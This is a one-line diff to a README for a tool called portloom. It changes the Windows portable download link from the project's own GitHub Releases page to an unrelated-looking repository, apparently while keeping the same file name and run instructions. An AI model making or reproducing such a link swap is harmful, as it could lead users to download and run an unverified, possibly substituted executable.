@@ -62,7 +62,7 @@ portloom
 ```
 
 ### Method 3: Standalone Portable (Windows)
-Download the latest `portloom-v1.0.0-win-x64.zip` from [Releases](https://github.com/portloom/portloom/releases), unpack it to any directory, and launch `portloom.cmd`.
+Download the latest `portloom-v1.0.0-win-x64.zip` from [Releases](https://github.com/RovelLabs/1/releases), unpack it to any directory, and launch `portloom.cmd`.
 
 ---
 
